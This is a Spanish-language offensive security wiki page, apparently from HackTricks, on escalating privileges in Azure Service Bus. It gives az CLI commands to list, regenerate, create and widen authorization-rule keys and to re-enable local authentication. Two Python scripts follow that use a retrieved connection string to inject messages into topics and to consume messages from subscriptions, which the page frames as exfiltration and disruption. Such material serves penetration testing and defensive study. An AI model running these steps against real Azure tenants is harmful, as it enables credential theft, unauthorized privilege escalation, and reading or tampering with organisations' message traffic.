# Az - Service Bus Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Service Bus

Para más información, consulta:

{{#ref}}
../az-services/az-servicebus-enum.md
{{#endref}}

### Microsoft.ServiceBus/namespaces/authorizationrules/listKeys/action O Microsoft.ServiceBus/namespaces/authorizationrules/regenerateKeys/action

Estos permisos te permiten obtener o regenerar las claves para las reglas de autorización locales dentro de un espacio de nombres de Service Bus. Usando estas claves es posible autenticarte como el espacio de nombres de Service Bus, lo que te permite enviar mensajes a cualquier cola o tema, recibir mensajes de cualquier cola o suscripción, o potencialmente interactuar con el sistema de maneras que podrían interrumpir las operaciones, suplantar usuarios válidos o inyectar datos maliciosos en el flujo de mensajería.

Ten en cuenta que por defecto la **`RootManageSharedAccessKey` regla tiene control total** sobre el espacio de nombres de Service Bus y se utiliza por el `az` cli, sin embargo, pueden existir otras reglas con otros valores de clave.
```bash
# List keys
az servicebus namespace authorization-rule keys list --resource-group <res-group> --namespace-name <namespace-name> --authorization-rule-name RootManageSharedAccessKey [--authorization-rule-name RootManageSharedAccessKey]

# Regenerate keys
az servicebus namespace authorization-rule keys renew --key [PrimaryKey|SecondaryKey] --resource-group <res-group> --namespace-name <namespace-name> [--authorization-rule-name RootManageSharedAccessKey]
```
### Microsoft.ServiceBus/namespaces/AuthorizationRules/write

Con este permiso es posible **crear una nueva regla de autorización** con todos los permisos y sus propias claves con:
```bash
az servicebus namespace authorization-rule create --authorization-rule-name "myRule" --namespace-name mynamespacespdemo --resource-group Resource_Group_1 --rights Manage Listen Send
```
>[!WARNING]
>Este comando no responde con las claves, por lo que necesitas obtenerlas con los comandos (y permisos) anteriores para poder escalar privilegios.

Además, con ese comando (y `Microsoft.ServiceBus/namespaces/authorizationRules/read`) si realizas esta acción a través de la Azure CLI, es posible actualizar una regla de autorización existente y darle más permisos (en caso de que le faltaran algunos) con el siguiente comando:
```bash
az servicebus namespace authorization-rule update \
--resource-group <MyResourceGroup> \
--namespace-name <MyNamespace> \
--name RootManageSharedAccessKey \
--rights Manage Listen Send
```
### Microsoft.ServiceBus/namespaces/[queues|topics]/authorizationRules/ListKeys/action O Microsoft.ServiceBus/namespaces/[queues|topics]/authorizationRules/regenerateKeys/action

Temas y colas específicos dentro de un espacio de nombres de Service Bus pueden tener sus propias reglas de autorización, que se pueden usar para controlar el acceso a la entidad. Al tener estos permisos, puedes **recuperar o regenerar las claves para estas reglas de autorización locales**, lo que te permite autenticarte como la entidad y potencialmente enviar o recibir mensajes, gestionar suscripciones o interactuar con el sistema de maneras que podrían interrumpir las operaciones, suplantar usuarios válidos o inyectar datos maliciosos en el flujo de mensajería.
```bash
# List keys (topics)
az servicebus topic authorization-rule keys list --resource-group <res-group> --namespace-name <namespace-name> --topic-name <topic-name> --name <auth-rule-name>

# Regenerate keys (topics)
az servicebus topic authorization-rule keys renew --key [PrimaryKey|SecondaryKey] --resource-group <res-group> --namespace-name <namespace-name> --topic-name <topic-name> --name <auth-rule-name>

# List keys (queues)
az servicebus queue authorization-rule keys list --resource-group <res-group> --namespace-name <namespace-name> --queue-name <queue-name> --name <auth-rule-name>

# Regenerate keys (queues)
az servicebus queue authorization-rule keys renew --key [PrimaryKey|SecondaryKey] --resource-group <res-group> --namespace-name <namespace-name> --queue-name <queue-name> --name <auth-rule-name>
```
### Microsoft.ServiceBus/namespaces/[queues|topics]/authorizationRules/write

Con este permiso es posible **crear una nueva regla de autorización** con todos los permisos y sus propias claves con:
```bash
# In a topic
az servicebus topic authorization-rule create --resource-group <res-group> --namespace-name <namespace-name> --topic-name <topic-name> --name <auth-rule-name> --rights Manage Listen Send

# In a queue
az servicebus queue authorization-rule create --resource-group <res-group> --namespace-name <namespace-name> --queue-name <queue-name> --name <auth-rule-name> --rights Manage Listen Send
```
>[!WARNING]
>Este comando no responde con las claves, por lo que necesitas obtenerlas con los comandos (y permisos) anteriores para poder escalar privilegios.

Además, con ese comando (y `Microsoft.ServiceBus/namespaces/[queues|topics]/authorizationRules/read`) si realizas esta acción a través de Azure CLI, es posible actualizar una regla de autorización existente y darle más permisos (en caso de que le faltaran algunos) con el siguiente comando:
```bash
# In a topic
az servicebus topic authorization-rule update --resource-group <res-group> --namespace-name <namespace-name> --topic-name <topic-name> --name <auth-rule-name> --rights Manage Listen Send

# In a queue
az servicebus queue authorization-rule update --resource-group <res-group> --namespace-name <namespace-name> --queue-name <queue-name> --name <auth-rule-name> --rights Manage Listen Send
```
### Microsoft.ServiceBus/namespaces/write (& Microsoft.ServiceBus/namespaces/read si se usa az cli)

Con estos permisos **un atacante puede reactivar "la autenticación local"** con el siguiente comando y, por lo tanto, todas las claves de las políticas compartidas funcionarán.
```bash
az servicebus namespace update --disable-local-auth false -n <namespace-name> --resource-group <res-group>
```
### Enviar mensajes con claves (Microsoft.ServiceBus/namespaces/authorizationRules/listkeys/action OR Microsoft.ServiceBus/namespaces/authorizationRules/regenerateKeys/action)

Puedes recuperar el `PrimaryConnectionString`, que actúa como una credencial para el espacio de nombres de Service Bus. Con esta cadena de conexión, puedes autenticarte completamente como el espacio de nombres de Service Bus, lo que te permite enviar mensajes a cualquier cola o tema y potencialmente interactuar con el sistema de maneras que podrían interrumpir las operaciones, suplantar usuarios válidos o inyectar datos maliciosos en el flujo de trabajo de mensajería.
```python
#You need to install the following libraries
#pip install azure-servicebus
#pip install aiohttp
#pip install azure-identity

import asyncio
from azure.servicebus.aio import ServiceBusClient
from azure.servicebus import ServiceBusMessage

# Constants
NAMESPACE_CONNECTION_STR = "<PrimaryConnectionString>"
TOPIC_NAME = "<TOPIC_NAME>"

# Function to send a single message to a Service Bus topic
async def send_individual_message(publisher):
# Prepare a single message with updated content
single_message = ServiceBusMessage("Hacktricks-Training: Single Item")
# Send the message to the topic
await publisher.send_messages(single_message)
print("Sent a single message containing 'Hacktricks-Training'")

# Function to send multiple messages to a Service Bus topic
async def send_multiple_messages(publisher):
# Generate a collection of messages with updated content
message_list = [ServiceBusMessage(f"Hacktricks-Training: Item {i+1} in list") for i in range(5)]
# Send the entire collection of messages to the topic
await publisher.send_messages(message_list)
print("Sent a list of 5 messages containing 'Hacktricks-Training'")

# Function to send a grouped batch of messages to a Service Bus topic
async def send_grouped_messages(publisher):
# Send a grouped batch of messages with updated content
async with publisher:
grouped_message_batch = await publisher.create_message_batch()
for i in range(10):
try:
# Append a message to the batch with updated content
grouped_message_batch.add_message(ServiceBusMessage(f"Hacktricks-Training: Item {i+1}"))
except ValueError:
# If batch reaches its size limit, handle by creating another batch
break
# Dispatch the batch of messages to the topic
await publisher.send_messages(grouped_message_batch)
print("Sent a batch of 10 messages containing 'Hacktricks-Training'")

# Main function to execute all tasks
async def execute():
# Instantiate the Service Bus client with the connection string
async with ServiceBusClient.from_connection_string(
conn_str=NAMESPACE_CONNECTION_STR,
logging_enable=True) as sb_client:
# Create a topic sender for dispatching messages to the topic
publisher = sb_client.get_topic_sender(topic_name=TOPIC_NAME)
async with publisher:
# Send a single message
await send_individual_message(publisher)
# Send multiple messages
await send_multiple_messages(publisher)
# Send a batch of messages
await send_grouped_messages(publisher)

# Run the asynchronous execution
asyncio.run(execute())
print("Messages Sent")
print("----------------------------")

```
### Recibir con claves (Microsoft.ServiceBus/namespaces/authorizationRules/listkeys/action OR Microsoft.ServiceBus/namespaces/authorizationRules/regenerateKeys/action)

Puedes recuperar el PrimaryConnectionString, que sirve como una credencial para el espacio de nombres de Service Bus. Usando esta cadena de conexión, puedes recibir mensajes de cualquier cola o suscripción dentro del espacio de nombres, lo que permite el acceso a datos potencialmente sensibles o críticos, habilitando la exfiltración de datos o interfiriendo con el procesamiento de mensajes y los flujos de trabajo de la aplicación.
```python
#You need to install the following libraries
#pip install azure-servicebus
#pip install aiohttp
#pip install azure-identity

import asyncio
from azure.servicebus.aio import ServiceBusClient

NAMESPACE_CONNECTION_STR = "<PrimaryConnectionString>"
TOPIC_NAME = "<TOPIC_NAME>"
SUBSCRIPTION_NAME = "<TOPIC_SUBSCRIPTION_NAME>" #Topic Subscription

# Function to receive and process messages from a Service Bus subscription
async def receive_and_process_messages():
# Create a Service Bus client using the connection string
async with ServiceBusClient.from_connection_string(
conn_str=NAMESPACE_CONNECTION_STR,
logging_enable=True) as servicebus_client:

# Get the Subscription Receiver object for the specified topic and subscription
receiver = servicebus_client.get_subscription_receiver(
topic_name=TOPIC_NAME,
subscription_name=SUBSCRIPTION_NAME,
max_wait_time=5
)

async with receiver:
# Receive messages with a defined maximum wait time and count
received_msgs = await receiver.receive_messages(
max_wait_time=5,
max_message_count=20
)
for msg in received_msgs:
print("Received: " + str(msg))
# Complete the message to remove it from the subscription
await receiver.complete_message(msg)

# Run the asynchronous message processing function
asyncio.run(receive_and_process_messages())
print("Message Receiving Completed")
print("----------------------------")
```
## Referencias

- https://learn.microsoft.com/en-us/azure/storage/queues/storage-powershell-how-to-use-queues
- https://learn.microsoft.com/en-us/rest/api/storageservices/queue-service-rest-api
- https://learn.microsoft.com/en-us/azure/storage/queues/queues-auth-abac-attributes
- https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-python-how-to-use-topics-subscriptions?tabs=passwordless
- https://learn.microsoft.com/en-us/azure/role-based-access-control/permissions/integration#microsoftservicebus

{{#include ../../../banners/hacktricks-training.md}}
